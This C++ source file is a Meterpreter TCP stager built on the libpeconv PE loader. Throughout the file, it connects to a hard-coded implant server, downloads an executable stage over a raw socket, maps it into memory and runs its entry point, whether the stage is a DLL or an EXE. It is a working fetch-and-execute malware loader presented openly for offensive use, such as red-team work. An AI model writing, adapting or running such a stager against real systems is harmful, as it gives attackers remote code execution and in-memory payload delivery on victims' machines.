/**
A basic meterpreter protocol (TCP) stager using libpeconv PE loader (EXE/DLL)
built from: https://github.com/hasherezade/libpeconv_tpl
*/

#include <winsock2.h>
#include <ws2tcpip.h>

#include <windows.h>
#include <iostream>
#include <tchar.h>

#include <peconv.h> // include libPeConv header

/* TCP meterpreter stager server parameters (ip, port) ::: define in Makefile */
#ifndef IMPLANT_IP
#define IMPLANT_IP "192.168.56.1"
#endif
#ifndef IMPLANT_PORT
#define IMPLANT_PORT 8889
#endif

BYTE* g_Payload = nullptr;
size_t g_PayloadSize = 0;

void fetch_payload()
{
  WSADATA wsa;
  SOCKET s;
  struct sockaddr_in cleanServer;
  int response_size;

  BYTE *buf;
  unsigned int bufsize;
  
  //Initialize Winsock
  if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
      printf("Error initializing Winsock\n");
      exit(1);
    }
  
  //Create socket
  if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
    {
      printf("Could not create socket : %d\n", WSAGetLastError());
      exit(1);
    }
  
  //cleanServer.sin_addr.s_addr = inet_addr("10.0.0.197"); //DEPRECATED
  InetPtonA(AF_INET, IMPLANT_IP, &cleanServer.sin_addr.s_addr);
  cleanServer.sin_family = AF_INET; //IPv4 Protocol
  cleanServer.sin_port = htons(IMPLANT_PORT); //Port number

  //If no error occurs, connect returns zero. Otherwise, it returns
  //SOCKET_ERROR, and a specific error code can be retrieved by calling //WSAGetLastError().
  if (connect(s, (struct sockaddr*)&cleanServer, sizeof(cleanServer)) < 0)
    {
      printf("Error establishing connection with server\n");
      exit(1);
    }
  
  if ((response_size = recv(s, (char*)&bufsize, 4, 0)) == SOCKET_ERROR) {
    printf("Receving data failed\n");
  }
  
  std::cout << "[*] stage size: " << bufsize << std::endl << std::flush;
  buf = (BYTE *)malloc(bufsize);
  std::cout << "[*] downloading stage: " << std::flush;
  
  unsigned int length = bufsize;
  int location = 0;
  while (length != 0) {
    int received = 0;
    received = recv(s, ((char*)(buf + location)), length, 0);
    location = location + received;
    length = length - received;
    //printf(".", received);
  }
  std::cout << "success!" << std::endl << std::flush;
  closesocket(s);
  std::cout << "[*] peconv::load_pe_executable: " << std::flush;
  g_Payload = peconv::load_pe_executable(buf, bufsize, g_PayloadSize);
  std::cout << "success!\n" << std::endl << std::flush;
}

int run_payload(int argc, LPTSTR argv[])
{
  if (!g_Payload) {
    std::cout << "[!] The payload is not loaded!\n";
    return -1;
  }
  
  // if needed, you can run TLS callbacks before the Entry Point:
  peconv::run_tls_callbacks(g_Payload, g_PayloadSize);
  
  //calculate the Entry Point of the manually loaded module
  DWORD ep_rva = peconv::get_entry_point_rva(g_Payload);
  if (!ep_rva) {
    std::cout << "[!] Cannot fetch EP!\n";
    return -2;
  }
  const ULONG_PTR ep_va = ep_rva + (ULONG_PTR)g_Payload;
  
  // run appropriate version of payload's main:
  int ret = 0;
  if (peconv::is_module_dll(g_Payload)) {
    //the prototype of the DllMain fuction:
    BOOL WINAPI _DllMain(
			 HINSTANCE hinstDLL,  // handle to DLL module
			 DWORD fdwReason,     // reason for calling function
			 LPVOID lpvReserved);  // reserved
    auto new_main = reinterpret_cast<decltype(&_DllMain)>(ep_va);
    
    // call the Entry Point of the manually loaded PE :
    ret = new_main((HINSTANCE)g_Payload, DLL_PROCESS_ATTACH, 0);
  }
  else {
    std::cout << "[+] starting EXE payload...\n" << std::flush;
    //the simplest prototype of the main fuction:
    int basic_main(int, LPTSTR []);
    auto new_main = reinterpret_cast<decltype(&basic_main)>(ep_va);

    //call the Entry Point of the manually loaded PE:
    ret = new_main(argc, argv);
  }
  return ret;
}

int _tmain(int argc, LPTSTR argv[])
{
  fetch_payload();
  std::cout << "[+] Payload loaded!\n" << std::flush;
  return run_payload(argc, argv);
}
